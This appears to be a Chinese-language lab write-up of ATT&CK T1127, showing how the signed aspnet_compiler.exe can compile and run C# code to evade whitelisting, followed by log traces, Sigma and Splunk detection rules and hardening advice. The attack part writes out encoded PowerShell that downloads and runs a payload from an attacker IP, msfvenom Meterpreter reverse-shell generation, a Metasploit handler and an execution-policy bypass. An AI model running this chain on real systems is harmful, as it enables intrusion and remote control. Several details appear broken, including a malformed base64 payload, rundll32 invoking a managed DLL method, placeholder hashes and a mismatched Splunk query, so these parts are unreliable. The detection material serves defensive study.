# T1127-受信任的开发者实用程序代理执行-Aspnet_compiler.exe(白名单)

## 描述

攻击者可利用受信任的开发者工具（如`aspnet_compiler.exe`）代理执行恶意Payload。`aspnet_compiler.exe`是ASP.NET编译工具，位于.NETFramework目录，由Microsoft签名，用于预编译ASP.NET应用程序。它可以通过特定的文件夹结构和BuildProvider执行C#代码，生成可执行文件或Web应用程序。

由于其合法签名，`aspnet_compiler.exe`可绕过应用程序白名单（如AppLocker）或防病毒软件检测。攻击者滥用该工具编译恶意C#代码，执行如远程访问工具或反弹Shell等行为，常用于防御规避、持久化或横向移动阶段。

## 测试案例

### 测试案例1：Aspnet_compiler.exe编译C#代码
`aspnet_compiler.exe`通过指定文件夹结构和BuildProvider执行C#代码。

**命令**：
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\Users\liyang\Desktop\asptest\ -f C:\Users\liyang\Desktop\asptest\none -u
```

- **文件夹结构（C:\Users\liyang\Desktop\asptest\）**：
  ```
  asptest/
  ├── App_Code/
  │   └── MaliciousCode.cs
  ├── malicious.aspx
  └── web.config
  ```

- **示例文件**：
  - `MaliciousCode.cs`：
    ```csharp
    using System;
    public class Malicious
    {
        public static void Execute()
        {
            System.Diagnostics.Process.Start("calc.exe");
        }
    }
    ```
  - `malicious.aspx`：
    ```html
    <%@ Page Language="C#" %>
    <% Malicious.Execute(); %>
    ```
  - `web.config`：
    ```xml
    <configuration>
      <system.web>
        <compilation debug="true" targetFramework="4.0" />
      </system.web>
    </configuration>
    ```

- **说明**：
  - `-v none`：指定虚拟路径为`none`。
  - `-p`：指定源文件夹（包含ASP.NET应用程序结构）。
  - `-f`：指定输出目录（编译结果）。
  - `-u`：生成可更新的编译输出。
  - 编译后，生成的代码可通过Web服务器（如IIS）或直接执行触发`calc.exe`。
- **权限**：普通用户可执行。
- **支持系统**：Windows7、Windows8、Windows8.1、Windows10（需安装.NETFramework4.0）。

## 检测日志

### 数据来源
- Windows安全日志：
  - 事件ID4688：进程创建，记录`aspnet_compiler.exe`的执行信息。
- Sysmon日志：
  - 事件ID1：进程创建，包含命令行、哈希值和父进程。
  - 事件ID11：文件创建，记录编译生成的文件（如`.dll`）。
  - 事件ID10：进程访问，记录子进程调用。
- 文件监控：
  - 检测非开发环境下的ASP.NET文件（如`.aspx`、`.cs`）或编译输出（如`.dll`）。
- 行为监控：
  - 检测`aspnet_compiler.exe`触发的子进程（如`calc.exe`）。

## 测试复现

### 环境准备
- 攻击机：KaliLinux2019
- 靶机：Windows10（需安装.NETFramework4.0）
- 工具：
  - MetasploitFramework（生成Payload和监听）
  - Sysmon（可选，日志收集）
  - IIS（可选，测试Web应用程序执行）

### 攻击分析

#### 测试1：Aspnet_compiler.exe编译恶意C#代码
1. **创建ASP.NET应用程序结构**：
   在靶机`C:\Users\liyang\Desktop\asptest\`创建以下文件：
   - `App_Code/MaliciousCode.cs`：
     ```csharp
     using System;
     public class Malicious
     {
         public static void Execute()
         {
             System.Diagnostics.Process.Start("powershell.exe", "-NoProfile -EncodedCommand JABjAG0AZAAgAD0AIAAiAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAIgA7ACQAdwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAJABjAG0AZAA7ACQAdwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAxAC4xADYAOgA4ADAALwBtAGEAbABpAGcAbgBhAG4AdAAuAGUAeABlACIALAAiAEMAOgBcAFQAZQBtAHAAXABtAGEAbABpAGcAbgBhAG4AdAAuAGUAeABlACIAKQAKAA==");
         }
     }
     ```
     - 解码后的PowerShell命令下载并执行`malicious.exe`。
   - `malicious.aspx`：
     ```html
     <%@ Page Language="C#" %>
     <% Malicious.Execute(); %>
     ```
   - `web.config`：
     ```xml
     <configuration>
       <system.web>
         <compilation debug="true" targetFramework="4.0" />
       </system.web>
     </configuration>
     ```

2. **编译代码**：
   ```cmd
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\Users\liyang\Desktop\asptest\ -f C:\Users\liyang\Desktop\asptest\none -u
   ```

3. **生成Payload**：
   在攻击机上生成`malicious.exe`：
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=12345 -f exe -o malicious.exe
   ```

4. **托管Payload**：
   启动HTTP服务器：
   ```bash
   cp malicious.exe /var/www/html/
   sudo python3 -m http.server 80
   ```

5. **配置攻击机监听**：
   ```bash
   msf5>use exploit/multi/handler
   msf5 exploit(multi/handler)>set payload windows/x64/meterpreter/reverse_tcp
   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
   msf5 exploit(multi/handler)>set LPORT 12345
   msf5 exploit(multi/handler)>exploit
   ```

6. **执行编译结果**：
   - 若使用IIS，部署编译输出到Web应用程序并访问`malicious.aspx`。
   - 直接执行编译后的DLL（如`none\bin\App_Code.dll`）：
     ```cmd
     rundll32.exe C:\Users\liyang\Desktop\asptest\none\bin\App_Code.dll,Malicious.Execute
     ```

7. **结果分析**：
   - 成功：编译生成DLL，执行后触发PowerShell下载并运行Payload，获得Meterpreter会话。
   - 失败可能：
     - .NETFramework未安装（需安装4.0）。
     - 防火墙阻止HTTP请求或TCP12345连接。
     - PowerShell执行策略限制（需设置为`Bypass`：`Set-ExecutionPolicy Bypass`）。
     - 文件夹结构错误（如缺少`App_Code`目录）。

## 测试留痕

### Windows安全日志
- 事件ID4688：
  - 记录`aspnet_compiler.exe`的进程创建：
    ```
    进程信息:
      新进程名称:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe
      命令行:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\Users\liyang\Desktop\asptest\ -f C:\Users\liyang\Desktop\asptest\none -u
      创建者进程名称:C:\Windows\System32\cmd.exe
    ```
  - 记录子进程（如`powershell.exe`）：
    ```
    进程信息:
      新进程名称:C:\Windows\System32\powershell.exe
      命令行:powershell.exe -NoProfile -EncodedCommand JABjAG0AZAAgAD0AIAAiAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAIgA7...
      创建者进程名称:C:\Windows\System32\rundll32.exe
    ```

### Sysmon日志
- 事件ID1：
  - 记录`aspnet_compiler.exe`执行：
    ```
    事件ID:1
    OriginalFileName:aspnet_compiler.exe
    CommandLine:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\Users\liyang\Desktop\asptest\ -f C:\Users\liyang\Desktop\asptest\none -u
    CurrentDirectory:C:\Users\liyang\
    User:DESKTOP-PT656L6\liyang
    Hashes:SHA1=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B
    ParentImage:C:\Windows\System32\cmd.exe
    ```
  - 记录子进程执行：
    ```
    事件ID:1
    OriginalFileName:powershell.exe
    CommandLine:powershell.exe -NoProfile -EncodedCommand JABjAG0AZAAgAD0AIAAiAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAIgA7...
    CurrentDirectory:C:\Users\liyang\
    User:DESKTOP-PT656L6\liyang
    Hashes:SHA1=2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C
    ParentImage:C:\Windows\System32\rundll32.exe
    ```
- 事件ID11：记录生成文件（如`none\bin\App_Code.dll`）。
- 事件ID3：记录网络连接（如PowerShell下载Payload）。

## 检测规则/思路

### 检测方法
1. 进程监控：
   - 检测`aspnet_compiler.exe`的执行，特别是在非开发环境中的调用。
   - 检查命令行是否包含`-v`、`-p`或`-f`参数。
2. 命令行分析：
   - 正则表达式匹配：
     ```regex
     aspnet_compiler\.exe.*(-v|-p|-f)
     ```
3. 文件监控：
   - 检测非开发目录下的ASP.NET文件（如`.aspx`、`.cs`）或编译输出（如`.dll`）。
4. 行为分析：
   - 检测`aspnet_compiler.exe`编译后生成的DLL被`rundll32.exe`或Web服务器加载。
   - 检测编译触发的子进程（如`powershell.exe`）。

### Sigma规则
优化后的Sigma规则，增强误报过滤：
```yaml
title:可疑Aspnet_compiler.exe执行
id:a01b8329-5953-4f73-ae2d-aa01e1f35f00
description:检测aspnet_compiler.exe编译C#代码，可能用于代理执行恶意Payload
status:experimental
author:frack113
date:2021/11/24
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/
tags:
  - attack.defense_evasion
  - attack.t1127
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    Image|contains:'\Microsoft.NET\Framework'
    Image|endswith:'\aspnet_compiler.exe'
    CommandLine|contains:
      - '-v'
      - '-p'
      - '-f'
  filter_legitimate:
    CurrentDirectory|contains:
      - 'C:\Program Files\'
      - 'C:\Program Files (x86)\'
  condition:selection and not filter_legitimate
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - 合法的ASP.NET开发活动
level:high
```

规则说明：
- 目标：检测`aspnet_compiler.exe`的编译行为。
- 过滤：排除开发目录（如`ProgramFiles`）中的合法操作。
- 日志来源：Windows事件ID4688（需启用命令行审计）或Sysmon事件ID1。
- 误报处理：开发环境可能触发，需结合目录和子进程分析。
- 级别：升级为“高”优先级，因`aspnet_compiler.exe`滥用通常与恶意活动相关。

### Splunk规则
```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 Image="*\aspnet_compiler.exe" CommandLine IN ("*-v*","*-p*","*-f*"))
OR (EventCode=11 FileName="*.dll" TargetFilename="*\aspnet_compiler.exe")
OR (EventCode=10 SourceImage="*\rundll32.exe" TargetImage="*.dll")
| fields Image,CommandLine,ParentImage,User,TargetFilename
```

规则说明：
- 检测`aspnet_compiler.exe`的编译行为、生成的文件和`rundll32.exe`加载DLL的行为。
- 减少误报：结合文件路径和后续执行行为分析。

### 检测挑战
- 误报：合法ASP.NET开发活动可能触发，需建立开发环境基线。
- 日志依赖：默认日志可能不记录完整命令行，需部署Sysmon或增强日志策略。

## 防御建议
1. 监控和日志：
   - 启用命令行审计策略，确保事件ID4688记录完整参数。
   - 部署Sysmon，配置针对`aspnet_compiler.exe`的规则，监控文件创建和子进程。
2. 权限控制：
   - 限制非开发用户执行`aspnet_compiler.exe`的权限。
3. 文件审查：
   - 定期扫描非开发目录下的`.aspx`、`.cs`和`.dll`文件，检查文件哈希。
4. 行为基线：
   - 建立开发环境的`aspnet_compiler.exe`使用基线，检测异常行为。
5. 安全更新：
   - 保持Windows和.NETFramework更新，修复潜在漏洞。

## 参考推荐
- MITREATT&CKT1127:  
  <https://attack.mitre.org/techniques/T1127/>
- Aspnet_Compiler.exe:LOLBAS:  
  <https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/>
- ASP.NET编译工具(Aspnet_compiler.exe):  
  <https://www.cnblogs.com/nmcfshang/articles/451265.html>
- Sysmon配置与检测:  
  <https://github.com/SwiftOnSecurity/sysmon-config>
- MetasploitFramework:用于生成和测试反弹Shell。  
  <https://www.metasploit.com/>
- Sysmon:Microsoft提供的系统监控工具。  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>
